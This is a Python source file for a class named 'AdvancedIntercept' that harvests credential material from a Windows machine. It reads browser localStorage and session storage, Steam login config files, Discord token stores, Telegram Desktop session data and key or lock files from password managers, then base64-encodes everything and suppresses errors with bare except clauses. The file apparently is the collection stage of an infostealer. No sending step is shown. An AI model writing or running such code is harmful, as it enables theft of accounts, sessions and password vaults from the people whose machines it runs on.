import sqlite3
import json
import os
import base64

class AdvancedIntercept:
    def __init__(self):
        self.data = {}
        
    def intercept_localstorage(self, browser_path):
        storage_data = {}
        try:
            if 'chrome' in browser_path.lower() or 'edge' in browser_path.lower():
                local_storage = os.path.join(browser_path, "Default", "Local Storage", "leveldb")
                if os.path.exists(local_storage):
                    storage_data['localStorage'] = self._read_leveldb(local_storage)
        except:
            pass
        return storage_data
        
    def intercept_websockets(self):
        websocket_data = []
        return websocket_data
        
    def intercept_session_storage(self, browser_path):
        session_data = {}
        try:
            if 'chrome' in browser_path.lower():
                session_path = os.path.join(browser_path, "Default", "Session Storage")
                if os.path.exists(session_path):
                    for file in os.listdir(session_path):
                        if file.endswith('.log'):
                            session_data[file] = self._read_file(os.path.join(session_path, file))
        except:
            pass
        return session_data
        
    def intercept_steam_auth(self):
        steam_path = os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'Steam', 'config')
        if not os.path.exists(steam_path):
            return {}
            
        auth_data = {}
        try:
            vdf_files = ['config.vdf', 'loginusers.vdf']
            for vdf_file in vdf_files:
                file_path = os.path.join(steam_path, vdf_file)
                if os.path.exists(file_path):
                    auth_data[vdf_file] = self._read_file(file_path)
        except:
            pass
        return auth_data
        
    def intercept_discord_tokens(self):
        discord_paths = [
            os.path.join(os.environ.get('APPDATA', ''), 'Discord', 'Local Storage', 'leveldb'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Discord', 'Local Storage', 'leveldb'),
        ]
        
        tokens = {}
        for path in discord_paths:
            if os.path.exists(path):
                tokens[path] = self._read_leveldb(path)
        return tokens
        
    def intercept_telegram_sessions(self):
        telegram_paths = [
            os.path.join(os.environ.get('APPDATA', ''), 'Telegram Desktop', 'tdata'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Telegram Desktop', 'tdata'),
        ]
        
        sessions = {}
        for path in telegram_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        sessions[file_path] = self._read_file(file_path)
        return sessions
        
    def intercept_password_manager_unlock(self):
        managers = ['1password', 'lastpass', 'bitwarden', 'dashlane', 'nordpass', 'keepass']
        unlock_keys = {}
        
        for manager in managers:
            paths = [
                os.path.join(os.environ.get('APPDATA', ''), manager),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), manager),
                os.path.join(os.environ.get('PROGRAMFILES', ''), manager),
            ]
            
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if 'key' in file.lower() or 'lock' in file.lower():
                                unlock_keys[file] = self._read_file(os.path.join(root, file))
        return unlock_keys
        
    def _read_leveldb(self, path):
        data = {}
        try:
            files = os.listdir(path)
            for file in files:
                file_path = os.path.join(path, file)
                data[file] = self._read_file(file_path)
        except:
            pass
        return data
        
    def _read_file(self, path):
        try:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except:
            return b''
